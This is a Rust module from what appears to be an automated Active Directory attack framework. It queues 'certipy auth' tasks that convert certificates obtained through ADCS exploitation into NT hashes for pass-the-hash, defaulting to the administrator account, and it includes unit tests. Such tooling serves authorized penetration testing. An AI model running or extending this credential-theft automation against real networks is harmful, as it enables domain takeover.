//! auto_certipy_auth -- authenticate using obtained certificates.
//!
//! After ADCS exploitation (ESC1/ESC4/ESC8) obtains a certificate (.pfx),
//! this automation dispatches `certipy auth` to convert the certificate
//! into an NT hash, enabling pass-the-hash for the impersonated user.
//!
//! Watches for `certificate_obtained` vulnerability type in discovered_vulnerabilities
//! which is registered by the ADCS exploitation result processor.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Authenticates with obtained certificates to extract NT hashes.
/// Interval: 30s.
pub async fn auto_certipy_auth(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("certipy_auth") {
            continue;
        }

        let work: Vec<CertAuthWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    let vtype = vuln.vuln_type.to_lowercase();
                    if vtype != "certificate_obtained" && vtype != "adcs_certificate" {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("cert_auth:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_CERTIPY_AUTH, &dedup_key) {
                        return None;
                    }

                    let pfx_path = vuln
                        .details
                        .get("pfx_path")
                        .or_else(|| vuln.details.get("certificate_path"))
                        .or_else(|| vuln.details.get("cert_file"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    let target_user = vuln
                        .details
                        .get("target_user")
                        .or_else(|| vuln.details.get("upn"))
                        .or_else(|| vuln.details.get("account_name"))
                        .and_then(|v| v.as_str())
                        .unwrap_or("administrator")
                        .to_string();

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(CertAuthWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        pfx_path,
                        domain,
                        target_user,
                        dc_ip,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "certipy_auth",
                "vuln_id": item.vuln_id,
                "pfx_path": item.pfx_path,
                "domain": item.domain,
                "target_user": item.target_user,
            });

            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
                payload["dc_ip"] = json!(dc);
            }

            let priority = dispatcher.effective_priority("certipy_auth");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        user = %item.target_user,
                        "Certificate authentication dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CERTIPY_AUTH, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CERTIPY_AUTH, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(vuln_id = %item.vuln_id, "Certificate auth deferred");
                }
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch cert auth");
                }
            }
        }
    }
}

struct CertAuthWork {
    vuln_id: String,
    dedup_key: String,
    pfx_path: String,
    domain: String,
    target_user: String,
    dc_ip: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("cert_auth:{}", "vuln-cert-001");
        assert_eq!(key, "cert_auth:vuln-cert-001");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_CERTIPY_AUTH, "certipy_auth");
    }

    #[test]
    fn cert_vuln_types_accepted() {
        let types = [
            "certificate_obtained",
            "adcs_certificate",
            "CERTIFICATE_OBTAINED",
        ];
        for t in &types {
            let lower = t.to_lowercase();
            assert!(
                lower == "certificate_obtained" || lower == "adcs_certificate",
                "{t} should match"
            );
        }
    }

    #[test]
    fn non_cert_vuln_types_rejected() {
        let non_cert = ["esc1", "smb_signing_disabled", "mssql_access"];
        for t in &non_cert {
            let lower = t.to_lowercase();
            assert!(lower != "certificate_obtained" && lower != "adcs_certificate");
        }
    }

    #[test]
    fn pfx_path_fallback_chain() {
        // Primary key
        let details = serde_json::json!({"pfx_path": "/tmp/cert.pfx"});
        let path = details
            .get("pfx_path")
            .or_else(|| details.get("certificate_path"))
            .or_else(|| details.get("cert_file"))
            .and_then(|v| v.as_str());
        assert_eq!(path, Some("/tmp/cert.pfx"));

        // Fallback to certificate_path
        let details2 = serde_json::json!({"certificate_path": "/tmp/alt.pfx"});
        let path2 = details2
            .get("pfx_path")
            .or_else(|| details2.get("certificate_path"))
            .or_else(|| details2.get("cert_file"))
            .and_then(|v| v.as_str());
        assert_eq!(path2, Some("/tmp/alt.pfx"));

        // Fallback to cert_file
        let details3 = serde_json::json!({"cert_file": "/tmp/other.pfx"});
        let path3 = details3
            .get("pfx_path")
            .or_else(|| details3.get("certificate_path"))
            .or_else(|| details3.get("cert_file"))
            .and_then(|v| v.as_str());
        assert_eq!(path3, Some("/tmp/other.pfx"));

        // No key returns None
        let details4 = serde_json::json!({});
        let path4 = details4
            .get("pfx_path")
            .or_else(|| details4.get("certificate_path"))
            .or_else(|| details4.get("cert_file"))
            .and_then(|v| v.as_str());
        assert!(path4.is_none());
    }

    #[test]
    fn target_user_fallback() {
        let details = serde_json::json!({"target_user": "admin"});
        let user = details
            .get("target_user")
            .or_else(|| details.get("upn"))
            .or_else(|| details.get("account_name"))
            .and_then(|v| v.as_str())
            .unwrap_or("administrator");
        assert_eq!(user, "admin");

        // Falls back to "administrator" when no key present
        let details2 = serde_json::json!({});
        let user2 = details2
            .get("target_user")
            .or_else(|| details2.get("upn"))
            .or_else(|| details2.get("account_name"))
            .and_then(|v| v.as_str())
            .unwrap_or("administrator");
        assert_eq!(user2, "administrator");
    }
}
